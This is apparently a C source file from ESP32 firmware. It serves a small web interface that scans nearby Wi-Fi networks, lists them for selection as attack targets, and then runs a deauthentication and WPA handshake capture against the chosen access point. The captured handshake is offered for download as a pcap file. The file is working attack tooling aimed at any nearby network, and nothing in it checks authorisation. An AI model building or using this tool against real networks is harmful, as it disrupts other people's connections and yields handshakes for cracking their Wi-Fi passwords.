/**
 * http_server.c
 *
 * Serves:
 *  - "/"       → redirects to "/scan"
 *  - "/scan"   → scans nearby Wi-Fi, lists SSIDs as clickable links
 *  - "/confirm?ssid=…&chan=…&bssid=…" → asks confirm/go-back
 *  - "/attack?ssid=…&chan=…&bssid=…"  → runs deauth+capture, then offers download
 *  - "/download" → serves /spiffs/handshake.pcap as attachment
 *
 * If handshake.pcap exists and the request is NOT /download, it is deleted and the user
 * is redirected to /scan. This frees up space automatically.
 */

#include "http_server.h"
#include "wifi_station.h"
#include "handshake_capture.h"
#include "pcap_writer.h"

#include "esp_log.h"
#include "esp_err.h"
#include "esp_vfs_spiffs.h"
#include "esp_http_server.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

static const char* TAG = "http_server";
static httpd_handle_t s_server = NULL;

// Forward declarations
static bool handshake_exists(void);
static bool check_and_clean(httpd_req_t* req);

static esp_err_t root_get_handler(httpd_req_t* req);
static esp_err_t scan_get_handler(httpd_req_t* req);
static esp_err_t confirm_get_handler(httpd_req_t* req);
static esp_err_t attack_get_handler(httpd_req_t* req);
static esp_err_t download_get_handler(httpd_req_t* req);

static const httpd_uri_t uri_root = {
    .uri      = "/",
    .method   = HTTP_GET,
    .handler  = root_get_handler,
    .user_ctx = NULL
};
static const httpd_uri_t uri_scan = {
    .uri      = "/scan",
    .method   = HTTP_GET,
    .handler  = scan_get_handler,
    .user_ctx = NULL
};
static const httpd_uri_t uri_confirm = {
    .uri      = "/confirm",
    .method   = HTTP_GET,
    .handler  = confirm_get_handler,
    .user_ctx = NULL
};
static const httpd_uri_t uri_attack = {
    .uri      = "/attack",
    .method   = HTTP_GET,
    .handler  = attack_get_handler,
    .user_ctx = NULL
};
static const httpd_uri_t uri_download = {
    .uri      = "/download",
    .method   = HTTP_GET,
    .handler  = download_get_handler,
    .user_ctx = NULL
};

/**
 * @brief Returns true if "/spiffs/handshake.pcap" exists.
 */
static bool handshake_exists(void)
{
    struct stat st;
    return (stat("/spiffs/handshake.pcap", &st) == 0);
}

/**
 * @brief If a handshake file exists and the requested URI != "/download",
 *        delete it and redirect to "/scan".
 * @return true if we performed the redirect/cleanup (caller should return ESP_OK).
 */
static bool check_and_clean(httpd_req_t* req)
{
    if (handshake_exists()) {
        if (strncmp(req->uri, "/download", 9) != 0) {
            // Delete handshake.pcap
            unlink("/spiffs/handshake.pcap");
            // Redirect to /scan
            httpd_resp_set_status(req, "302 Found");
            httpd_resp_set_hdr(req, "Location", "/scan");
            httpd_resp_send(req, NULL, 0);
            return true;
        }
    }
    return false;
}

httpd_handle_t start_webserver(void)
{
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.stack_size = 8 * 1024; // 8 KB stack

    if (httpd_start(&s_server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start HTTP server");
        return NULL;
    }
    httpd_register_uri_handler(s_server, &uri_root);
    httpd_register_uri_handler(s_server, &uri_scan);
    httpd_register_uri_handler(s_server, &uri_confirm);
    httpd_register_uri_handler(s_server, &uri_attack);
    httpd_register_uri_handler(s_server, &uri_download);
    ESP_LOGI(TAG, "HTTP server started");
    return s_server;
}

void stop_webserver(httpd_handle_t server)
{
    if (server) {
        httpd_stop(server);
        ESP_LOGI(TAG, "HTTP server stopped");
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// URI: "/"
// Redirect straight to /scan
static esp_err_t root_get_handler(httpd_req_t* req)
{
    if (check_and_clean(req)) {
        return ESP_OK;
    }
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/scan");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

// ──────────────────────────────────────────────────────────────────────────────
// URI: "/scan"
// Scan nearby APs and list them as clickable SSIDs
static esp_err_t scan_get_handler(httpd_req_t* req)
{
    if (check_and_clean(req)) {
        return ESP_OK;
    }

    uint16_t count = 0;
    wifi_ap_record_t* ap_list = NULL;
    if (wifi_scan_once(&count, &ap_list) != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Scan failed");
        return ESP_FAIL;
    }

    // Build a simple HTML page
    httpd_resp_set_type(req, "text/html");
    httpd_resp_sendstr_chunk(req,
        "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>Scan Wi-Fi</title></head><body>"
        "<h2>Select Network to Attack</h2><ul>");
    for (int i = 0; i < count; i++) {
        // Escape SSID for HTML
        char ssid_esc[64] = {0};
        int pos = 0;
        for (int j = 0; j < ap_list[i].ssid_len && j < 31; j++) {
            char c = (char)ap_list[i].ssid[j];
            if (c == '"' || c == '<' || c == '>') {
                continue;
            }
            ssid_esc[pos++] = c;
        }
        ssid_esc[pos] = 0;

        // Build link: /confirm?ssid=...&rssi=...&chan=...&bssid=...
        char line[256];
        snprintf(line, sizeof(line),
            "<li><a href=\"/confirm?ssid=%s&amp;rssi=%d&amp;chan=%d"
            "&amp;bssid=%02x:%02x:%02x:%02x:%02x:%02x\">%s</a></li>",
            ssid_esc,
            ap_list[i].rssi,
            ap_list[i].primary,
            ap_list[i].bssid[0], ap_list[i].bssid[1], ap_list[i].bssid[2],
            ap_list[i].bssid[3], ap_list[i].bssid[4], ap_list[i].bssid[5],
            ssid_esc);
        httpd_resp_sendstr_chunk(req, line);
    }
    httpd_resp_sendstr_chunk(req, "</ul></body></html>");
    httpd_resp_sendstr_chunk(req, NULL);

    free(ap_list);
    return ESP_OK;
}

// ──────────────────────────────────────────────────────────────────────────────
// URI: "/confirm?ssid=XXX&rssi=YY&chan=ZZ&bssid=AA:BB:CC:DD:EE:FF"
// Show “Confirm or Go Back” for the selected SSID/channel/BSSID
static esp_err_t confirm_get_handler(httpd_req_t* req)
{
    if (check_and_clean(req)) {
        return ESP_OK;
    }

    char ssid[33] = {0}, rssi_str[8] = {0}, chan_str[8] = {0}, bssid[18] = {0};
    char buf[128];
    httpd_req_get_url_query_str(req, buf, sizeof(buf));
    httpd_query_key_value(buf, "ssid", ssid, sizeof(ssid));
    httpd_query_key_value(buf, "rssi", rssi_str, sizeof(rssi_str));
    httpd_query_key_value(buf, "chan", chan_str, sizeof(chan_str));
    httpd_query_key_value(buf, "bssid", bssid, sizeof(bssid));

    if (strlen(ssid) == 0 || strlen(bssid) != 17) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad parameters");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_sendstr_chunk(req,
        "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>Confirm</title></head><body>");
    char line[256];
    snprintf(line, sizeof(line),
        "<h2>Confirm attack on SSID: <b>%s</b> (Channel %s)</h2>"
        "<a href=\"/attack?ssid=%s&chan=%s&bssid=%s\">Confirm</a> &nbsp; "
        "<a href=\"/scan\">Go Back</a>",
        ssid, chan_str, ssid, chan_str, bssid);
    httpd_resp_sendstr_chunk(req, line);
    httpd_resp_sendstr_chunk(req, "</body></html>");
    httpd_resp_sendstr_chunk(req, NULL);
    return ESP_OK;
}

// ──────────────────────────────────────────────────────────────────────────────
// URI: "/attack?ssid=XXX&chan=ZZ&bssid=AA:BB:CC:DD:EE:FF"
// Run deauth + handshake capture, then show “Download” link
static esp_err_t attack_get_handler(httpd_req_t* req)
{
    if (check_and_clean(req)) {
        return ESP_OK;
    }

    char ssid[33] = {0}, chan_str[8] = {0}, bssid_str[18] = {0};
    char buf[128];
    httpd_req_get_url_query_str(req, buf, sizeof(buf));
    httpd_query_key_value(buf, "ssid", ssid, sizeof(ssid));
    httpd_query_key_value(buf, "chan", chan_str, sizeof(chan_str));
    httpd_query_key_value(buf, "bssid", bssid_str, sizeof(bssid_str));

    if (strlen(ssid) == 0 || strlen(chan_str) == 0 || strlen(bssid_str) != 17) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad parameters");
        return ESP_FAIL;
    }

    int channel = atoi(chan_str);
    if (channel < 1 || channel > 13) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid channel");
        return ESP_FAIL;
    }

    // Convert BSSID string "AA:BB:CC:DD:EE:FF" → byte[6]
    uint8_t bssid[6];
    int vals[6];
    if (sscanf(bssid_str, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2],
               &vals[3], &vals[4], &vals[5]) != 6) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad BSSID");
        return ESP_FAIL;
    }
    for (int i = 0; i < 6; i++) {
        bssid[i] = (uint8_t) vals[i];
    }

    // Run deauth + capture for 20 s (20000 ms)
    esp_err_t ret = handshake_deauth_and_capture(bssid, (uint8_t)channel, 20000);
    if (ret != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Capture failed");
        return ESP_FAIL;
    }

    // Now handshake.pcap exists → show Download link
    httpd_resp_set_type(req, "text/html");
    httpd_resp_sendstr_chunk(req,
        "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>Done</title></head><body>"
        "<h2>Handshake captured!</h2>"
        "<a href=\"/download\">Download handshake.pcap</a><br>"
        "<a href=\"/scan\">Attack another</a>"
        "</body></html>");
    httpd_resp_sendstr_chunk(req, NULL);
    return ESP_OK;
}

// ──────────────────────────────────────────────────────────────────────────────
// URI: "/download"
// Serve "/spiffs/handshake.pcap" as attachment
static esp_err_t download_get_handler(httpd_req_t* req)
{
    if (!handshake_exists()) {
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "No handshake to download");
        return ESP_FAIL;
    }

    int fd = open("/spiffs/handshake.pcap", O_RDONLY);
    if (fd < 0) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Cannot open file");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/octet-stream");
    httpd_resp_set_hdr(req, "Content-Disposition", "attachment; filename=handshake.pcap");

    char buf[1024];
    ssize_t r;
    while ((r = read(fd, buf, sizeof(buf))) > 0) {
        httpd_resp_send_chunk(req, buf, r);
    }
    close(fd);
    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}
